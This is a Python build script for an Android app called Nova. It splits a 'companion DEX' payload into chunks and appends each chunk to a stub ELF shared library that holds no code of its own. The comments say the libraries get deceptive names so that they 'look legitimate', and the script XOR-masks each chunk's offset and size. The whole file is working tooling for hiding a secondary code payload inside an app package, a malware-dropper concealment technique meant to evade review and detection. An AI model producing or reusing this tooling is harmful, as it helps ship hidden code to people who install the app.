#!/usr/bin/env python3
"""
chunk_embedder.py — Phase 3 Step 23

Appends each companion DEX chunk to a different stub .so file in Nova jniLibs/.
Each .so starts as a minimal valid ELF binary, then has one chunk appended.
The chunk appears as trailing data after valid ELF content — looks legitimate.

Usage:
  python3 scripts/chunk_embedder.py \
    --manifest /tmp/chunk_manifest.json \
    --jnilibs-dir app/src/main/jniLibs \
    --updated-manifest /tmp/chunk_manifest_embedded.json
"""

import os
import sys
import json
import struct
import hashlib
import argparse

# ── Minimal valid ELF stub ────────────────────────────────────────────────────
# A real minimal ELF shared library for ARM64 and ARM32
# These are genuine empty .so files that Android's dynamic linker accepts

def make_elf_arm64(so_name: str) -> bytes:
    """Generate minimal valid ELF64 shared library for arm64-v8a."""
    # ELF Header (64 bytes)
    # e_ident: magic, class(64), data(LE), version, OS/ABI, padding
    e_ident = (
        b'\x7fELF'          # magic
        b'\x02'             # EI_CLASS = ELFCLASS64
        b'\x01'             # EI_DATA = ELFDATA2LSB (little-endian)
        b'\x01'             # EI_VERSION = EV_CURRENT
        b'\x00'             # EI_OSABI = ELFOSABI_NONE
        b'\x00' * 8         # EI_ABIVERSION + padding
    )
    # ELF header fields
    e_type      = struct.pack('<H', 3)       # ET_DYN (shared object)
    e_machine   = struct.pack('<H', 0xB7)   # EM_AARCH64
    e_version   = struct.pack('<I', 1)       # EV_CURRENT
    e_entry     = struct.pack('<Q', 0)       # no entry point
    e_phoff     = struct.pack('<Q', 64)      # program header right after elf header
    e_shoff     = struct.pack('<Q', 0)       # no section headers
    e_flags     = struct.pack('<I', 0)
    e_ehsize    = struct.pack('<H', 64)      # ELF header size
    e_phentsize = struct.pack('<H', 56)      # PH entry size for 64-bit
    e_phnum     = struct.pack('<H', 1)       # 1 program header
    e_shentsize = struct.pack('<H', 64)
    e_shnum     = struct.pack('<H', 0)
    e_shstrndx  = struct.pack('<H', 0)

    elf_header = (e_ident + e_type + e_machine + e_version +
                  e_entry + e_phoff + e_shoff + e_flags +
                  e_ehsize + e_phentsize + e_phnum +
                  e_shentsize + e_shnum + e_shstrndx)

    # Program header: PT_LOAD covering the ELF header itself
    p_type   = struct.pack('<I', 1)          # PT_LOAD
    p_flags  = struct.pack('<I', 5)          # PF_R | PF_X
    p_offset = struct.pack('<Q', 0)          # offset in file
    p_vaddr  = struct.pack('<Q', 0)          # virtual address
    p_paddr  = struct.pack('<Q', 0)
    p_filesz = struct.pack('<Q', 64 + 56)    # elf header + program header
    p_memsz  = struct.pack('<Q', 64 + 56)
    p_align  = struct.pack('<Q', 0x1000)

    prog_header = (p_type + p_flags + p_offset + p_vaddr + p_paddr +
                   p_filesz + p_memsz + p_align)

    return elf_header + prog_header


def make_elf_arm32(so_name: str) -> bytes:
    """Generate minimal valid ELF32 shared library for armeabi-v7a."""
    # ELF Header (52 bytes for 32-bit)
    e_ident = (
        b'\x7fELF'
        b'\x01'             # EI_CLASS = ELFCLASS32
        b'\x01'             # EI_DATA = ELFDATA2LSB
        b'\x01'             # EI_VERSION
        b'\x00'             # EI_OSABI
        b'\x00' * 8
    )
    e_type      = struct.pack('<H', 3)       # ET_DYN
    e_machine   = struct.pack('<H', 0x28)   # EM_ARM
    e_version   = struct.pack('<I', 1)
    e_entry     = struct.pack('<I', 0)
    e_phoff     = struct.pack('<I', 52)      # program header after elf header
    e_shoff     = struct.pack('<I', 0)
    e_flags     = struct.pack('<I', 0x05000200)  # ARM EABI v5
    e_ehsize    = struct.pack('<H', 52)
    e_phentsize = struct.pack('<H', 32)      # PH entry size for 32-bit
    e_phnum     = struct.pack('<H', 1)
    e_shentsize = struct.pack('<H', 40)
    e_shnum     = struct.pack('<H', 0)
    e_shstrndx  = struct.pack('<H', 0)

    elf_header = (e_ident + e_type + e_machine + e_version +
                  e_entry + e_phoff + e_shoff + e_flags +
                  e_ehsize + e_phentsize + e_phnum +
                  e_shentsize + e_shnum + e_shstrndx)

    # Program header (32-bit)
    p_type   = struct.pack('<I', 1)          # PT_LOAD
    p_offset = struct.pack('<I', 0)
    p_vaddr  = struct.pack('<I', 0)
    p_paddr  = struct.pack('<I', 0)
    p_filesz = struct.pack('<I', 52 + 32)
    p_memsz  = struct.pack('<I', 52 + 32)
    p_flags  = struct.pack('<I', 5)          # PF_R | PF_X
    p_align  = struct.pack('<I', 0x1000)

    prog_header = (p_type + p_offset + p_vaddr + p_paddr +
                   p_filesz + p_memsz + p_flags + p_align)

    return elf_header + prog_header


# ── .so naming scheme ─────────────────────────────────────────────────────────
# Names look like legitimate Android system/utility libraries
SO_NAMES = [
    'libdatabridge',
    'libsyncworker',
    'libfilehandler',
    'libcachemanager',
    'libtaskrunner',
    'libworkagent',
    'libresmanager',
    'libnetbridge',
]


def embed_chunks(manifest_path: str, jnilibs_dir: str, out_manifest_path: str):
    """Step 23: Embed each chunk into a separate .so file."""

    with open(manifest_path) as f:
        manifest = json.load(f)

    n_chunks  = manifest['n_chunks']
    chunks    = manifest['chunks']
    build_uuid = manifest['build_uuid']
    xor_key   = manifest['xor_mask_key']

    print(f"[Step 23] Embedding {n_chunks} chunks into .so files")
    print(f"  jniLibs: {jnilibs_dir}")

    abis = ['arm64-v8a', 'armeabi-v7a']
    embedded = []

    for chunk_info in chunks:
        idx  = chunk_info['index']
        path = chunk_info['path']
        size = chunk_info['size']

        # Read chunk bytes
        with open(path, 'rb') as f:
            chunk_bytes = f.read()

        # Pick .so name for this chunk index
        so_base = SO_NAMES[idx % len(SO_NAMES)]
        so_name = f"{so_base}.so"

        chunk_embed_info = {
            'chunk_index': idx,
            'so_name':     so_name,
            'abis':        {},
        }

        for abi in abis:
            abi_dir = os.path.join(jnilibs_dir, abi)
            os.makedirs(abi_dir, exist_ok=True)
            so_path = os.path.join(abi_dir, so_name)

            # Generate ELF stub appropriate for this ABI
            if abi == 'arm64-v8a':
                elf_stub = make_elf_arm64(so_name)
            else:
                elf_stub = make_elf_arm32(so_name)

            # Record offset where chunk starts (after ELF stub)
            chunk_offset = len(elf_stub)

            # Append chunk after valid ELF content
            so_bytes = elf_stub + chunk_bytes

            # XOR-mask the offset and size (Step 24)
            masked_offset = chunk_offset ^ xor_key
            masked_size   = len(chunk_bytes) ^ xor_key

            with open(so_path, 'wb') as f:
                f.write(so_bytes)

            so_sha256 = hashlib.sha256(so_bytes).hexdigest()

            chunk_embed_info['abis'][abi] = {
                'so_path':      so_path,
                'elf_size':     len(elf_stub),
                'chunk_offset': chunk_offset,
                'chunk_size':   len(chunk_bytes),
                'masked_offset':masked_offset,
                'masked_size':  masked_size,
                'so_sha256':    so_sha256,
                'so_total_size':len(so_bytes),
            }

            print(f"  [{abi}] {so_name}: ELF={len(elf_stub)}B + chunk={len(chunk_bytes)/1024:.1f}KB "
                  f"→ total={len(so_bytes)/1024:.1f}KB")
            print(f"    offset=0x{chunk_offset:08x} masked=0x{masked_offset:08x}")

        embedded.append(chunk_embed_info)

    # Update manifest with embedding info
    manifest['embedded'] = embedded
    manifest['abis']     = abis

    with open(out_manifest_path, 'w') as f:
        json.dump(manifest, f, indent=2)

    print(f"\n[Step 23] ✅ All chunks embedded")
    print(f"  Updated manifest: {out_manifest_path}")
    return manifest


def main():
    parser = argparse.ArgumentParser(description='Phase 3 Chunk Embedder')
    parser.add_argument('--manifest',         required=True, help='Input chunk manifest JSON')
    parser.add_argument('--jnilibs-dir',      required=True, help='Nova jniLibs directory')
    parser.add_argument('--updated-manifest', required=True, help='Output updated manifest JSON')
    args = parser.parse_args()

    embed_chunks(args.manifest, args.jnilibs_dir, args.updated_manifest)


if __name__ == '__main__':
    main()
